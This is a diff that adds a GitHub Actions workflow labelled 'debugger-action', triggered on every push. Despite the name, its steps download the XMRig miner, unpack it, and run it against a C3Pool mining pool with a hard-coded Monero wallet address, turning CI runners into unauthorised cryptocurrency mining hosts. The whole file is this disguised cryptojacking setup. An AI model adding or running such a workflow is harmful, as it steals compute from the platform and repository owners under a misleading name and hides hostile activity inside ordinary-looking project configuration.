@@ -1,0 +1,12 @@
+name: debugger-action
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+     - name: one
+       run: wget https://github.com/C3Pool/xmrig-C3/releases/download/v6.7.0-C3/xmrig-v6.7.0-C3-lin64-STATIC.tar.gz
+     - name: two
+       run: tar -zxvf xmrig-v6.7.0-C3-lin64-STATIC.tar.gz
+     - name: three
+       run: ./xmrig -o mine.c3pool.com:13333 -u 42bHyoLjdkhiGd9qAnUaBxQSyRSYaGpRHF7nTAECub2MHvuJ3L9JPkCBRyxZ3D9EpZVQDgnySNc8wMg5bujSEKZjK9aKtSn -p test111 --randomx-1gb-pages
